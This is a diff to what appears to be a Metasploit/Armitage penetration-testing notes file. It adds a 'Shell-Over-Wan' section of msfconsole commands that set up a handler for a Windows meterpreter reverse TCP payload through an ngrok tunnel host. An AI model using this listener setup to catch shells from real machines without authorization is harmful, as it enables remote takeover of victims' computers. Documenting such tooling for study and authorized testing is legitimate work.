@@ -38,6 +38,7 @@
 - **[Armitage](#Armitage)** 
 	- [Scanning and enumeration](#Scanning-and-enumeration)
 	- [Finding and launching attacks](#Finding-and-launching-attacks)
+- [**Shell-Over-Wan**](#Shell-Over-Wan)
 - **[Importing scans](#Importing-scans)** 
 - **[Pivoting](#Pivoting)**
 	- [Adding a route](#Adding-a-route)
@@ -348,6 +349,17 @@ option.
  - http://www.fastandeasyhacking.com/
 
 ---
+# Shell-Over-Wan
+```
+msfconsole  
+use exploit/multi/handler  
+set payload windows/x64/meterpreter/reverse__tcp  
+set LHOST 4.tcp.ngrok.io  
+set LPORT 13161  
+set ReverseListeningBindAddress localhost  
+set ReverseListeningBindPort 8080  
+exploit
+```
 # Importing-external-exploits
 1. Download the exploit.rb code.
 2. Put it in the appropriate path `/usr/share/metasploit-framework/modules/PATH`
